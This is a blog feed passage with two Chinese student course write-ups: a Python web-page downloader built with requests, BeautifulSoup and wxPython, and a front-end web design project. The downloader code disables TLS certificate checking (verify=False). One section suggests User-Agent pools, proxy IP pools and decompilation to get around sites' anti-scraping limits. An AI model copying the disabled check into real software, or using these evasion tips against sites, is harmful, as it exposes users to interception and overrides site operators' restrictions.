        <content type="html"><![CDATA[<h1><center>网站源代码下载器的设计与实现</center></h1>> **摘要：**随着时代的进步以及科技的发展，人们越来越多的需要高效地从互联网上获取所需的信息，然而其对网络的要求和一些站点人为的限制，却也制约了用户对网络信息的获取和保存。对此，针对于一项可以实现将网站数据便捷获取并长期保存的网站源代码下载器进行了学习研究设计开发，主要应用了爬虫技术通过伪装成客户端与服务器进行数据交互，实现数据采集。可视化网站源代码下载器将实现对用户输入站点的下载实现长期保存，便于用户访问。<p><strong>关键词：</strong> <code>计算机网络</code>   <code>网络爬虫</code>   <code>WxPython正则表达式</code>   <code>requests</code></p><h3 id="1-HTTP协议"><a href="#1-HTTP协议" class="headerlink" title="1.HTTP协议"></a>1.HTTP协议</h3><p>HTTP 报文是在应用程序之间发送的数据块,这些数据块将通过以文本形式的元信息开头，用于 HTTP 协议交互。请求端(客户端)的 HTTP 报文叫做请求报文，响应端(服务器端)的叫做响应报文。 HTTP 报文本身是由多行(用 CR+LF 作换行符)数据构成的字符串文本。（图1.1 Http报文格式）</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\Http报文格式.png" style="zoom:150%;" /><center>图1.1 Http报文格式</center>### 2.网络爬虫<p>网络爬虫就是自动从互联网中定向或者不定项的采集信息的一种程序。网络爬虫通过伪装成客户端与服务器进行数据交互的，从而实现数据采集，搜索引擎，模拟操作等功能（图2.1 网络爬虫知识图谱）。网络爬虫大致可分为三大模块即，发送请求获取数据，解析数据与获取数据。</p><p>爬虫的第一个步骤是获取数据，就是对起始 URL 发送请求，以获取其返回的响应，值得注意的是，发送请求实质上是指发送请求报文的过程。其报文头部的内容广泛使用于反爬虫策略与抗反爬虫策略。</p><p>数据下载是数据爬取过程中的重要环节。执行数据下载之前首先需要对数据爬取对象网站进行全面地了解，包括此网站数据展示介质、网站背景、网站的组织结构及今后的发展等，在对爬取对象可能出现的展示形式（Web、PC 端应用、APP）进行分析后，才能确定要爬取的具体展现形式[5]</p><p>一个完整的爬虫应用不光涉及网络技术，在获取并下载数据后，还需要对数据进行分析，提取需要的信息，并对数据进行可视化分析和展示。</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\网络爬虫知识图谱.png"  /><center>图2.1 网络爬虫知识图谱</center>#### 2.1 requests<p>requests库是基于<code>urllib</code>库，采用<code>Apache2 Licensed </code>开源协议编写的，基于其内置的urllib3，其允许程序发送HTTP/1.1请求，且不需要手动的为URL添加查询字串，也不需要对<strong>POST</strong>数据进行表单编码，可以轻易的向对应的网站发起请求，从而对网页数据进行获取，还可以获取服务器返回的响应内容和状态码。</p><h4 id="2-2-正则表达式"><a href="#2-2-正则表达式" class="headerlink" title="2.2 正则表达式"></a>2.2 正则表达式</h4><p>正则表达式是使用单个字符串来描述、匹配一系列符合某个句法规则的字符串，是一种匹配字符串的方法，通过一些特殊符号，实现快速查找、删除、替换某个特定字符串。正则表达式一般用于脚本编程与文本编辑器中，在本程序中通过python re库正则表达式匹配方法，实现对正确输入文本的匹配及对部分内容的批量替换。</p><h4 id="2-3-WxPython"><a href="#2-3-WxPython" class="headerlink" title="2.3 WxPython"></a>2.3 WxPython</h4><p>WxPython是一个开发桌面端图形界面的跨平台函数库，开发语言为Python，它是基于C++的函数库wxWidgets的封装的跨平台GUI工具。</p><h4 id="2-4-Beautiful-Soup"><a href="#2-4-Beautiful-Soup" class="headerlink" title="2.4 Beautiful Soup"></a>2.4 Beautiful Soup</h4><p>Beautiful Soup就是Python的一个HTML或XML的解析库，提供一些简单的、Python式的函数来处理导航、搜索、修改分析树等功能，主要用于将HTML标签转换为Python对象树，并通过解析文档为用户提供需要抓取的数据。</p><h4 id="2-5-抗反爬虫策略"><a href="#2-5-抗反爬虫策略" class="headerlink" title="2.5 抗反爬虫策略"></a>2.5 抗反爬虫策略</h4><p>随着反爬虫程序被研发利用来，越多的网站都有自己的反爬机制，抓取数据已经不像以前那么容易。</p><p>目前，大部分网站都希望正常的用户进行访问，不希望爬虫轻易抓取他们的网站。究其原因，爬虫一方面会给他们的网站带来无用的性能压力，另一方面爬虫会造成他们网站的数据被“盗取”，于是，这些网站开始制定相应的反爬虫策略。一般的反爬策略例如：设置单个IP在单位时间内不能请求次数超过阈值或者请求的频率高于他们认为的人为行为频率、请求参数中带有他们加密后的字段值等。</p><p>要解决网站反爬的问题，首先要知道自己被封的原因和对方的“封堵机制”，这样才能更有效地使用上面的措施解决问题。针对单个IP单位时间内不能请求超过阈值情况，我们需要更改自己的抗反爬策略，一般情况下可以使用User-Agent池、降低下载频率、使用代理IP池等方式解决 ；针对数据加密的情况，可以通过反编译进行解决。</p><h4 id="2-6-关于网络爬虫的法律问题"><a href="#2-6-关于网络爬虫的法律问题" class="headerlink" title="2.6 关于网络爬虫的法律问题"></a>2.6 关于网络爬虫的法律问题</h4><p>遵守Robots协议，此协议声明那些内容不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。 </p><p>不能造成对方服务器瘫痪，2021年颁布实施的《数据安全管理办法》规定网络运营者采取自动化手段访问收集网站数据，不得妨碍网站正常运行[5]</p><p>不能非法获利，不能涉及个人隐私采集的信息，属于公民个人信息的，有可能构成非法获取公民个人信息的违法行为，情节严重的，有可能构成“侵犯公民个人信息罪”因此爬虫开发者的道德和良知才是避免触碰法律底线的根本所在。</p><h3 id="3-设计方法及思路"><a href="#3-设计方法及思路" class="headerlink" title="3. 设计方法及思路"></a><strong>3.</strong> 设计方法及思路</h3><h4 id="3-1-问题分析"><a href="#3-1-问题分析" class="headerlink" title="3.1 问题分析"></a>3.1 问题分析</h4><p>网站源代码下载器这一程序设计的关键在于如何使用户更加便利的保存网络站点上的信息，实现在无互联网的情况下的长期保存。程序将在完成，发送请求获取数据，解析数据与获取数据这三大基本功能的前提下，实现将网页原始数据的加工处理。</p><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\流程图.png"  /><h4 id="3-2-设计思路"><a href="#3-2-设计思路" class="headerlink" title="3.2 设计思路"></a>3.2 设计思路</h4><p>基于网络爬虫下实现网站源代码下载器的设计开发，在针对大量网站进行研究后，总结部分结论，不同类型站点网页设计人员对项目设计的方式差异性明显，部分站点可能因为开发时间和后期的修改，呈现出十分混乱的特点，这些都增加了网站源代码下载器的设计难度。针对以上特点，对网站源代码下载器的功能进行设计，利用正则匹配等方式尽可能保留站点原始样貌。</p><p>对于程序设计采用python语言，建立两大模块，即可视化客户端与网络爬虫程序，本项目的网络爬虫程序接近于聚焦网络爬虫，聚焦到特定主题目标网站进行爬取，包含页面爬取模块、无关链接过滤等功能。再对爬取到的信息进行提取和分析，最终能够运行实现网站源码下载器的开发。</p><h3 id="4-具体代码设计及运行"><a href="#4-具体代码设计及运行" class="headerlink" title="4. 具体代码设计及运行"></a>4. 具体代码设计及运行</h3><p>设置一个class类Frame，使用WxPython库的方法实现可视化程序的实现并提供后台接口（如图3.1 网络源代码下载器），通过输入事件监听与正则表达式对用户输入数据进行分析。在输入内容符合要求时通过后台网络爬虫，之后进行数据采集。实现网站源代码下载器的应用。（如图3.2 网站源码下载反馈）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"网站地址不能为空!"</span><span class="token punctuation">,</span> <span class="token string">"错误信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        match<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> match<span class="token punctuation">:</span>            download_img<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\网络源代码下载器.png"  /><center>图4.1 网络源代码下载器</center>后台程序接收到可执行的信息后，对信息做出后续处理。对网页内各种资源标签进行匹配，将网页数据（如图片，CSS文件，JS文件）保存至本地，并将其转为相对路径，便于用户直接使用。（如图4.2 本地存储文件、图4.3 本地网页展示）<img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\本地存储文件.png"  /><center>图4.2 本地存储文件</center><img src="D:\blog\shierjinghuang\source\_posts\课程论文-源代码下载器的设计实现\本地网页展示.png" style="zoom: 150%;" /><center>图4.3 本地网页展示</center>在程序的后台处理中依次实现了，发送请求获取数据，解析数据与获取数据请求获取数据，并对其进行解析：<pre class="line-numbers language-python" data-language="python"><code class="language-python">host <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">u'[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\.?'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>Host <span class="token operator">=</span> <span class="token string">'https://'</span><span class="token operator">+</span> host<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>bsobj <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>a<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span> <span class="token comment"># 将网页源码构造成BeautifulSoup对象，方便操作</span>a_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 获取网页中的所有a标签对象</span>script_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的script标签</span>link_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的link标签</span>img_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对获取到的数据在运行空间暂存，程序对其进行分析，生成标准URL，再次转入数据获取函数，在数据获取完成后，对文件进行格式化保存，将通过数据解析的数据，以其在服务器的相对位置进行存储。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_file</span><span class="token punctuation">(</span>chdir_path<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'webp'</span><span class="token punctuation">,</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'.gif'</span><span class="token punctuation">,</span> <span class="token string">'.bmp'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'images/'</span> <span class="token operator">+</span> filename <span class="token punctuation">,</span> <span class="token string">"wb+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'js'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'js/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'css'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'css/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为便于用户后期的直接长期阅读，程序后台还通过re模块通过正则匹配将原程序Html文件及CSS中超链接路径匹配为相应的相对路径。</p><h3 id="5．总结"><a href="#5．总结" class="headerlink" title="5．总结"></a>5．总结</h3><p>本文使用Python程序设计软件设计开发了简单的源代码下载器，利用WxPython的有关知识，建立了可视化端口，为爬虫程序提供可用接口，基于网络爬虫的原理下，成功的设计出了程序，实现了网站源码下载器的开发。并且在正则表达式的支持下，将网页原始路径转化为相对路径，不会出现因防盗链和文件路径的不准确或者丢失的情况出现。实现了在没有互联网的情况之下数据的长期保存。</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p>[1] 朱荣.《python与大数据分析应用》.清华大学出版社.2021.3.P101-P107</p><p>[2] 谢希仁.《计算机网络》.电子工业出版社.2013.6.P35-P37、P115-P124、P238-P241</p><p>[3] 吴海燕,佟秋利《我国网络安全法律法规体系框架》.中国教育网络.2021.08 P66-P67</p><p>[4] 2021 Bad Bot Report [EB/OL]. <a href="https://www.imperva.com/resources/reports/Bad-Bot-Report">https://www.imperva.com/resources/reports/Bad-Bot-Report</a> 2021</p><p>[5] 孟宝灿,《Python网络爬虫应用探讨》广播电视信息 2022.03 P108-P110</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
            <tag> Python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年Web程序设计大作业与课程论文</title>
      <link href="/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
      <url>/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写这个主要是我们，那个Web前段开发设计的课采用的是大作业的方式，正好今天我期末结束，任务基本完工，整理下今年做的一些东西。</p></blockquote><h2 id="绿动出行企业门户的设计与实现"><a href="#绿动出行企业门户的设计与实现" class="headerlink" title="绿动出行企业门户的设计与实现"></a>绿动出行企业门户的设计与实现</h2><p>[TOC]</p><h3 id="1-网站相关知识"><a href="#1-网站相关知识" class="headerlink" title="1.网站相关知识"></a>1.网站相关知识</h3><h4 id="1-1目录结构规范、各种标识符命名规范"><a href="#1-1目录结构规范、各种标识符命名规范" class="headerlink" title="1.1目录结构规范、各种标识符命名规范"></a>1.1目录结构规范、各种标识符命名规范</h4><p>建立一个好的前端应该具有一个好的目录结构，每个前端项目总是包含库、jQuery插件和大量的JavaScript脚本与CSS文件，以达到不同的目的和目标。我们需要将所有东西通过遵循一种模式或公约置入文件夹中，以此来保持清晰、整洁。这对我们而言是非常重要的</p><ol><li>整洁的结构：<ul><li>CSS（主文件夹）这个文件夹包含了所有CSS文件。例如index.css可以对应控制index.html文件</li><li>image/img 存放所有的图片文件：.png、.jpg、.jpeg、壁纸等。</li><li>JS (主文件夹) 存放.js文件 </li><li>media 存放多媒体文件  一般指视频与音频文件，在部分情况下可以分为多个媒体文件夹。</li></ul></li></ol><h4 id="1-2文件名命名规范"><a href="#1-2文件名命名规范" class="headerlink" title="1.2文件名命名规范"></a>1.2文件名命名规范</h4><p>文件名称统一用小写的英文字母、数字和下划线的组合，其中不得包含汉字、空格和特殊字符；命名原则的指导思想一是使得每一个成员能够方便的理解每一个文件的意义，二是当我们在文件夹中使用“按名称排例”的命令时，同一种大类的文件能够排列在一起，以便我们查找、修改、替换、计算负载量等等操作。</p><p>引文件统一使用index.htm index.html index.asp文件名（小写） 各子页命名的原则首先应该以栏目名的英语翻译取单一单词为名称例如本系统中已经完成的login.html（登录页面）,about.html(关于我们)</p><h4 id="1-3-HTML结构"><a href="#1-3-HTML结构" class="headerlink" title="1.3 HTML结构"></a>1.3 HTML结构</h4><p>HTML的全称为超文本标记语言，是一种标记语言。它包括一系列标签．通过这些标签可以将网络上的<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3/1009768">文档</a>格式统一，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC/5443630">文本</a>，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p><p>一、常见HTML元素</p><ol><li>盒子模型<ul><li>块级标签：<code>&lt;p&gt;/&lt;h1&gt;/&lt;table&gt;/&lt;ol&gt;/&lt;ul&gt;/&lt;form&gt;/&lt;div&gt;</code></li><li>内联标签：<code>&lt;a&gt;/&lt;input/&gt;/&lt;img/&gt;/&lt;sub&gt;/&lt;sup&gt;/&lt;textarea&gt;/&lt;span&gt;</code></li></ul></li><li>特殊字符：&lt;&gt; ×©</li><li>图像标签：<code>&lt;img src=&quot;&quot; width=&quot;&quot; height=&quot;&quot;/&gt;</code></li><li>表格：<code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code></li><li>表单：<code>&lt;form&gt;&lt;lable for=&quot;A&quot;&gt;&lt;/lable&gt;&lt;input type=””placeholder=”” name=”A” id=”A” pattern=””/&gt;&lt;/form&gt;</code></li><li>列表：<code>&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ol&gt;&lt;li&gt;&lt;/li&gt;&lt;/ol&gt;&lt;dl&gt;&lt;dt&gt;&lt;dt&gt;&lt;/dd&gt;&lt;/dd&gt;&lt;/dl&gt;</code></li><li>音频：<code>&lt;audio&gt;&lt;/audio&gt;</code></li><li>视频：<code>&lt;video&gt;&lt;/video&gt;</code></li><li>浮动框架：<code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ol><p>HTML5是构建Web内容的一种语言描述方式。HTML5是互联网的下一代标准，是构建以及呈现互联网内容的一种语言方式．被认为是互联网的核心技术之一。在2012年已经形成稳定版本。</p><ul><li>全新结构元素：<ul><li>头部标签：<code>&lt;header&gt;&lt;/header&gt;</code></li><li>导航栏标签：<code>&lt;nav&gt;&lt;/nav&gt;</code></li><li>底部标签：<code>&lt;footer&gt;&lt;/footer&gt;</code></li></ul></li></ul><h4 id="1-4-CSS层叠样式表"><a href="#1-4-CSS层叠样式表" class="headerlink" title="1.4 CSS层叠样式表"></a>1.4 CSS层叠样式表</h4><p>层叠样式表(Cascading Style Sheets)是一种用来表现HTML或XML等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>一、CSS3</p><p>CSS3是CSS层叠样式表技术的升级版本，于1999年开始制订，2001年5月23日W3C完成了CSS3的工作草案，主要包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块</p><blockquote><p>使用方式：包括内联方式，嵌入方式，链接方式，导入方式</p></blockquote><p>内联方式指的是直接在 HTML 标签中的 style 属性中添加 CSS。内联方式引入 CSS 代码会导致 HTML 代码变得冗长，且使得代码难以维护。</p><p>嵌入方式的 CSS 只对当前的网页有效，当多个页面需要引入相同的 CSS 代码时，这样写会导致代码冗余，也不利于维护。</p><p>链接方式这是最常见的也是最推荐的引入 CSS 的方式。使用这种方式，所有的 CSS 代码只存在于单独的 CSS 文件中，所以具有良好的可维护性。并且所有的 CSS 代码只存在于 CSS 文件中，CSS 文件会在第一次加载时引入，以后切换页面时只需加载 HTML 文件即可。</p><p>在本次的项目中，由于导师所做要求，暨整个网站有一外部CSS文件控制所有页面的统一样式，每个页面的个别样式采用内部CSS。所以同时采用了以上三种使用方式。</p><ul><li>CSS选择器：<ul><li>标签选择器（全局）、类选择器（最多）、id选择器（锚点）</li><li>通配符选择器</li><li>并集选择器、交集选择器、后代选择器</li><li>伪类选择器 :first-child,:last-child,nth-of-type(n)</li><li>伪元素选择器 :link :hover :visited</li></ul></li><li>字体样式：<ul><li>字体大小：font-size</li><li>字体：font-family</li><li>字体粗细：font-weight</li></ul></li><li>文本外观<ul><li>文本颜色：color</li><li>文本行间距：line-height</li><li>文本对齐方式：text-align</li><li>首行缩进：text-indent:2em;</li><li>标识文本溢出：text-overflow:ellipsis;</li><li>文本格式：text-decoration: underline;</li></ul></li><li>背景：<ul><li>背景颜色：background-color</li><li>背景图片：background-image</li><li>背景图像平铺：background-repeat:no-repeat;</li><li>背景图像位置：background-position:center center;</li><li>背景图像固定：background-attachment:fixed;</li><li>背景图像大小：background-size:cover/ % %;</li></ul></li><li>表单：<ul><li>接收并处理表单数据的服务器程序的地址：action=”#”</li><li>提交方式：method=”post”</li><li>表单名称：name=””</li><li>表单控件form、select控件、textarea控件</li></ul></li><li>视频/音频：<ul><li>自动播放：autoplay:autoplay;</li><li>结束重新开始：loop:loop;</li><li>缓冲不足连接一个图像：poster:url();</li><li>静音播放：muted</li><li>显示按键：controls:controls;</li></ul></li><li>CSS媒体查询<ul><li>媒体查询旨在为不同的设备（显示器、平板电脑、手机等）定义不同的样式规则，使用媒体查询是一种流行的技术，可以向台式机、笔记本电脑、平板电脑和手机（例如 iPhone 和 Android 手机）提供定制的样式表。</li></ul></li></ul><h4 id="1-5-JavaScript和JQuery动态"><a href="#1-5-JavaScript和JQuery动态" class="headerlink" title="1.5 JavaScript和JQuery动态"></a>1.5 JavaScript和JQuery动态</h4><p>JavaScript（简称“JS”）是一种具有函数优先的轻量级，解释型或即时编译型的高级编程语言。虽然它是作为开发web页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。</p><p>jQuery 是一个 JavaScript 库，也是一个JS文件。 JQ中封装实现了很多方法，让使用变得更加简单不再像js那样需要使用大量的方法调用。但JQ也只是实现了一些方法，还有些没有实现，因此能够使用JQ是实现的，JS都能做，但是能够用JS做的，JQ不一定能够实现。</p><h3 id="2-网站的设计与实现"><a href="#2-网站的设计与实现" class="headerlink" title="2.网站的设计与实现"></a>2.网站的设计与实现</h3><h4 id="2-1-index-html"><a href="#2-1-index-html" class="headerlink" title="2.1 index.html"></a>2.1 index.html</h4><ul><li><p>头部和导航栏：</p><p>在整个项目中Header及footer的内容都是一致的，增加了代码的复用性，又增强了整个网页格式的统一。</p><p>在index页面中，存在整个项目唯一的nav元素，主要原因在于在实现过程中，我将Header元素用作链接整体，就淡化了<code>&lt;nav&gt;</code>标签的作用。</p><p>可以注意到在第二行右侧，出现了几个圆形图标，在这里是引入iconfont.ttf图标文字库代替图标图片。因为目前为止项目后端并没有完成，班列定制，APP下载等功能并没有进行开发。</p></li><li><p>banner块布局</p><p>在这一块引入了内嵌的JS代码做了一个简单地JS动态窗口，具体体现就是在banner块的中央位置插入了我一句比较喜欢的名言，也是我博客上所展示的”从来没有真正的绝境, 只有心灵的迷途”,”Never really desperate, only the lost of the soul”。</p><p>Banner块的底部通过CSS修饰，通过button按钮，页内超连接，与img图片属性制作出一个向下开启绿色生活的跳转样式。</p><img src="./Web大作业/1.png" style="zoom: 67%;" /><center>2.1 绿动出行主业</center></li><li><p>主体DIV块布局</p><p>该页面主题我采用了三列的弹性盒，在左右两栏通过CSS的:hover 选择器设置，鼠标悬停效果和动画，在鼠标选中时，通过css动画将原本置于页面左右两侧，背景和字体颜色都通过RGBA设为透明的两个块，通过transition: all 0.5s ease-in 0s;以及改变透明度的方式呈现出动画效果</p><p>中间列，通过JS与JQ实现了一个多图轮播机制，通过index.js代码进行控制实现页面的展示效果的增强。</p><img src="./Web大作业/2.png" style="zoom:67%;" /><center>2.2 多图轮播页面</center></li><li><p>Footer页面设置</p><p>在footer页面展示稍微少一些，这边我实际上只是采用了表格和图片进行了样式修饰，没有太多的其他效果。</p></li><li><p>全页效果</p><p>页面采用了css3媒体查询的方式，在窗口大小过小时整体会呈现出一个单列布局（图2.1-3 在手机端单列布局的展示），采用<code>&lt;source&gt;</code>标签进行背景音频的播放。</p><p><img src="./Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/3.png"></p><center>2.3 媒体查询下效果</center></li></ul><h4 id="2-2-project-html"><a href="#2-2-project-html" class="headerlink" title="2.2 project.html"></a>2.2 project.html</h4><img src="./Web大作业/4.png" style="zoom:67%;" /><center>2.4 project.html</center>这个页面因为一些对老师要求的理解失误，这个页面便采用的是外部链接样式+内部CSS样式上，通过cards和card标签为下方图片增加卡片效果，同时也采用了一些简单的媒体查询，会在屏幕大小较小是将其改为单列图片。<h4 id="2-3-about-html"><a href="#2-3-about-html" class="headerlink" title="2.3 about.html"></a>2.3 about.html</h4><p>这一个页面也是整体多是CSS做的显示内容，通过背景和容器两层标签的使用，在container块中依次通过居中，设置内边距与外边距完成整体的样式设计。使背景正好覆盖整个页面的上半部分，文字和视频部分居中。</p><img src="./Web大作业/5.png" style="zoom:67%;" /><center>图2.5 关于我们页面</center>#### 2.4 login.html<p>这一个登录和注册页面其实并没有采用表单，只是通过修饰的两列输入栏，通过内置的js代码进行匹配，当鼠标点击对应位置时js代码段对content标签进行验证，将其改为对应的显示。</p><img src="./Web大作业/6.png" style="zoom:67%;" /><center>图2.6 登录页面</center>#### 2.5 information_acquisition.html<p>这个页面实际上是最初没有的，到现在也跟整个项目有些格格不入，在这个页面内，通过表格和表单嵌套使用做出整体美观的显示，之后通过HTML代码和JS代码进行输入验证。</p><ul><li><p>HTML验证:</p><p>由于HTML5有很多全新的表单控件，比如input type=”email” ，在这些控件在进行HTML代码会自动对其进行合法性验证，同时在不具备自动验证的块，通过设置正则表达式完成对块数据的验证如：pattern=”^[\u4e00-\u9fa5]{0,}$”这就是一个判断是否为中文的验证。</p></li><li><p>JS输入验证：</p><p>因为是临时赶工做出来的页面，我对其要求也有所降低，JS验证是通过在每个需要进行验证的输入栏后面设置一个空的块，块里不赋值，在点击注册后表单通过onsubmit=”return validateForm()”将数据传递给页面内的js validateForm()函数对其进行空值验证。</p></li></ul><img src="./Web大作业/7.png" style="zoom:67%;" /><h4 id="2-6-user-html"><a href="#2-6-user-html" class="headerlink" title="2.6 user.html"></a>2.6 user.html</h4><p>这个页面也是在最后跟老师的实验要求进行对比后再补充的一个页面，具体采用了列表加浮动框架的方式进行设计，在列表左侧为链接栏目，通过在链接栏中选择页面，会加载到右侧的浮动框架中。</p><img src="./Web大作业/8.png" style="zoom:67%;" /><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 